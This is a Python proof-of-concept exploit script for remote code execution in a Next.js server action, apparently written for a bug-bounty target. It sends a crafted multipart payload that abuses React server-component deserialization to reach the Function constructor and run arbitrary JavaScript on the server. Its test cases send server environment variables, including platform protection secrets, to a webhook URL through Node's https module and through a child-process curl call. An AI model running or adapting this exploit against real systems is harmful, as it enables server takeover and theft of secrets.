#!/usr/bin/env python3
"""
Original lachlan2k POC payload structure
This is the EXACT format that was submitted to Meta
"""

import requests
import json
import random
import string

TARGET = "https://nextjs-cve-hackerone.vercel.app"
ACTION_ID = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"
WEBHOOK = "https://webhook.site/f794cbb8-6c39-49cc-987a-a141d67c244a"

def lachlan_poc(javascript_code):
    """
    Use the exact lachlan2k payload structure
    """
    print(f"\n[*] Executing: {javascript_code[:100]}...")

    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    # The exact payload structure from lachlan2k's original POC
    payload = {
        '0': '$1',
        '1': {
            'status': 'resolved_model',
            'reason': 0,
            '_response': '$4',
            'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            'then': '$2:then'
        },
        '2': '$@3',
        '3': [],
        '4': {
            '_prefix': f'{javascript_code}//',  # The // comments out the rest
            '_formData': {
                'get': '$3:constructor:constructor'
            },
            '_chunks': '$2:_response:_chunks',
        }
    }

    # Send each chunk as a separate form field
    body = ''
    for key, value in payload.items():
        body += f'------{boundary}\r\n'
        body += f'Content-Disposition: form-data; name="{key}"\r\n\r\n'
        if isinstance(value, dict) or isinstance(value, list):
            body += json.dumps(value)
        else:
            body += value
        body += '\r\n'
    body += f'------{boundary}--\r\n'

    headers = {
        'Next-Action': ACTION_ID,
        'Content-Type': f'multipart/form-data; boundary=----{boundary}',
        'Accept': 'text/x-component',
    }

    response = requests.post(TARGET, data=body, headers=headers, timeout=20)
    print(f"[+] Status: {response.status_code}")
    print(f"[+] Response: {response.text[:300]}")
    return response

print("="*70)
print("Original lachlan2k POC Structure")
print("="*70)

# Test 1: Simple calculation (original POC)
lachlan_poc("console.log(7*7+1)")

# Test 2: Direct env var access
code2 = f"""
require('https').get('{WEBHOOK}?flag=' + process.env.VERCEL_PLATFORM_PROTECTION)
"""
lachlan_poc(code2.strip())

# Test 3: Just env var
code3 = f"""
const h=require('https');
h.get('{WEBHOOK}?v=' + process.env.VERCEL_PLATFORM_PROTECTION)
"""
lachlan_poc(code3.strip())

# Test 4: All VERCEL vars
code4 = f"""
const h=require('https');
const v=Object.keys(process.env).filter(k=>k.includes('VERCEL')).join(',');
h.get('{WEBHOOK}?vars=' + v)
"""
lachlan_poc(code4.strip())

# Test 5: Child process with curl
code5 = f"""
require('child_process').exec('curl {WEBHOOK}?flag=$(printenv VERCEL_PLATFORM_PROTECTION)')
"""
lachlan_poc(code5.strip())

print(f"\n[*] Check webhook: {WEBHOOK}")
print("="*70)
